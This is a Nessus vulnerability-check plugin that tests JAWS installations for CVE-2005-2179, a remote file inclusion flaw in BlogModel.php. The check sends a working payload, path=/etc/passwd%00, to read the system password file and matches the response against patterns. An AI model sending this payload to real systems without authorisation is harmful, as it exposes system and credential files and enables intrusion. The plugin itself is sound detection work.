#
# This script was written by Josh Zlatin-Amishav
#
# GPLv2
#
# Fixed by Tenable:
#   - added CVE xref
#   - added See also and Solution.
#   - fixed script family.
#   - changed exploit and test of its success.
#   - added osvdb ref, updated plugin title, enhanced description (1/8/2009)


include("compat.inc");

if(description)
{
  script_id(19395);
  script_cve_id("CVE-2005-2179");
  script_bugtraq_id(14158);
  script_osvdb_id(17792);
  script_version("$Revision: 1.11 $");
  script_name(english:"Jaws BlogModel.php path Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running JAWS, a content management system written
in PHP. 

The remote version of Jaws allows an attacker to include URLs
remotely. This may allow for the execution of arbitrary code
with the privileges of the web server." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory-072005.php" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to JAWS version 0.5.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/06");
 script_cvs_date("$Date: 2011/03/15 19:22:15 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Detect Jaws File Inclusion Vulnerability";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"Copyright (C) 2005-2011 Josh Zlatin-Amishav");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) ) exit(0);

foreach dir ( cgi_dirs() )
{
  req = http_get(
    item:string(
      dir, "/gadgets/Blog/BlogModel.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( res == NULL ) exit(0);

  if ( 
    # we could read /etc/passwd.
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we got an error suggesting magic_quotes_gpc was enabled but
    # remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
   security_warning(port);
   exit(0);
  }
}
